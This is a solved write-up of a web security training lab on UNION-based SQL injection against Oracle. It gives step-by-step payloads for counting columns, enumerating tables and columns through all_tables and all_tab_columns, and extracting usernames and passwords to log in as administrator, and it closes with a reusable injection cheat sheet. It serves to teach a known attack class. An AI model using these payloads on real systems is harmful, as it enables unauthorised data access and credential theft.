# SQL Injection: Listing Database Contents on Oracle


**Lab:** SQL injection attack, listing the database contents on Oracle

**Difficulty:** Practitioner

**Status:** Solved ✅


## Goal


Exploit a SQL injection vulnerability in the **product category filter** to:


1. Determine the number of columns.

2. Identify the database tables.

3. Find the table containing users.

4. Identify its columns.

5. Retrieve usernames and passwords.

6. Log in as the `administrator` user.



---



## 1. Determine the Number of Columns



The injection point was the `category` parameter.


Initial payload:



```sql

' UNION SELECT NULL--

```



This showed that the query required more than one column.



Testing:



```sql

' UNION SELECT NULL,NULL FROM dual--

```



The response confirmed:



```text

2 columns

```



### Oracle Note



Oracle requires a `FROM` clause for this type of `SELECT`, so we use:



```sql
FROM dual

```




---



## 2. Enumerate Database Tables




Oracle provides table information through:



```sql

all_tables


```



Payload:



```sql


' UNION SELECT table_name,NULL FROM all_tables--

```



The response revealed:



```text
APP_USERS_AND_ROLES

USERS_AYGDQM

```



The interesting table was:



```text

USERS_AYGDQM

```



---


## 3. Enumerate Columns



Oracle's `all_tab_columns` view can be used to retrieve column names.



Payload:



```sql

' UNION SELECT column_name,NULL

FROM all_tab_columns

WHERE table_name='USERS_AYGDQM'--

```


The response revealed:


```text

PASSWORD_OGRIWL

USERNAME_GRMFEJ

```


Therefore:


```text

Table: USERS_AYGDQM


Columns:

- USERNAME_GRMFEJ

- PASSWORD_OGRIWL

```



> Oracle object names are commonly stored in uppercase when they were created without quoted identifiers.



---



## 4. Retrieve User Credentials



Now that the table and column names were known:



```sql

' UNION SELECT USERNAME_GRMFEJ,PASSWORD_OGRIWL

FROM USERS_AYGDQM--

```



The response returned the users and their passwords.




The administrator credentials were:



```text

Username: administrator


Password: [retrieved from the lab response]

```


Then log in as:


```text

administrator
```



**LAB SOLVED ✅**



---


## Attack Flow


```text

SQL Injection

     ↓

Determine column count


     ↓

2 columns

     ↓

Enumerate tables

     ↓

USERS_AYGDQM

     ↓

Enumerate columns

     ↓

USERNAME_GRMFEJ

PASSWORD_OGRIWL

     ↓

Retrieve credentials

     ↓

administrator

     ↓

Login

     ↓

LAB SOLVED

```


## Important Oracle Cheat Sheet



```sql

-- Number of columns

' UNION SELECT NULL,NULL FROM dual--



-- List tables

' UNION SELECT table_name,NULL FROM all_tables--



-- List columns

' UNION SELECT column_name,NULL

FROM all_tab_columns

WHERE table_name='TABLE_NAME'--



-- Extract data

' UNION SELECT column1,column2

FROM TABLE_NAME--

```


### Key Takeaway


**UNION-based SQL injection** lets us combine the application's original query with a second `SELECT` statement to retrieve data from another table. In Oracle, `all_tables`, `all_tab_columns`, and `dual` are especially useful when enumerating the database. [PortSwigger — SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks?utm_source=chatgpt.com)
